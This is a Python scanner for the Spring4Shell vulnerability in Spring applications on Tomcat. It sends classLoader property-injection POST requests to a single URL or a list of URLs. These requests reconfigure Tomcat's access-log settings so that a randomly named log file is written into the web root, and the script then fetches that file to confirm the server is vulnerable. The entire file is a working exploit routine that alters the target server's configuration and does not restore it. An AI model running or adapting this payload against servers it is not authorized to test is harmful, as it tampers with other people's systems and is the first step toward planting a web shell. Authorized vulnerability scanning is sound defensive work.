import requests,argparse,os,binascii,time

from termcolor import cprint
from urllib.parse import urlsplit
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


parser = argparse.ArgumentParser()

parser.add_argument("-u", "--url",
                    dest="url",
                    help="Check a single URL.",
                    action='store')
parser.add_argument("-l", "--list",
                    dest="usedlist",
                    help="Check a list of URLs.",
                    action='store')
parser.add_argument("-w","--write-to",
                     dest="directory",
                     help="Directory we should test usually webapps/{appname} or webapps/ROOT",
                     action="store")

args = parser.parse_args()

def main():
    urls = []
    if args.url:
        urls.append(args.url)
    if args.usedlist:
        with open(args.usedlist, "r") as f:
            for i in f.readlines():
                i = i.strip()
                if i == "" or i.startswith("#"):
                    continue
                urls.append(i)
    directory = 'webapps/ROOT'
    if args.directory:
        directory = args.directory
    check_spring4shell(urls,directory)

def check_spring4shell(urls,directory):

        for url in urls:
                cprint ("[+] Checking Spring4Shell on: "+url,"yellow")
                try:
                        #proxy = {'http':'http://127.0.0.1:8081'}
                        headers = {"Content-Type":"application/x-www-form-urlencoded"}
                        random_bytes = binascii.b2a_hex(os.urandom(15))
                        encoding = 'utf-8'
                        random_log_file =  str(random_bytes,encoding)
                        #random_log_file = 'testing'
                        data =  (
                                'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.log'
                                f'&class.module.classLoader.resources.context.parent.pipeline.first.directory={ directory }'
                                f'&class.module.classLoader.resources.context.parent.pipeline.first.prefix={ random_log_file }'
                                '&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_'
                                )

                        reset = (
                                 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat='
                                 '&class.module.classLoader.resources.context.parent.pipeline.first.pattern='
                                )

                        cprint(f"[+] Attempting to create log file: { random_log_file }","yellow")

                        requests.post(url,data=reset,headers=headers,verify=False,allow_redirects=False,timeout=5)
                        time.sleep(5)
                        requests.post(url,data=data,headers=headers,verify=False,allow_redirects=False,timeout=5)
                        cprint("[+] Checking too see if log file is created. Please wait","yellow")

                        b = urlsplit(url)
                        base_url = b.scheme+"://"+b.netloc+"/"
                        time.sleep(5)


                        x = requests.get(base_url+random_log_file+".log", timeout=15,allow_redirects=False,verify=False)
                        y = requests.get(base_url+random_log_file+"_.log",timeout=15,allow_redirects=False,verify=False)

                        if x.status_code == 200 or y.status_code == 200:
                                cprint(f"[+] Got a hit on the random log file { random_log_file }\n[+] TARGET IS VULNERABLE!","red") 
                        else:
                            cprint("[+] Nothing happened, it's still a glorious day for the SOC Team\n[+] Quitting!","blue")
                            exit()
                except requests.exceptions.RequestException as e:
                        pass

main()
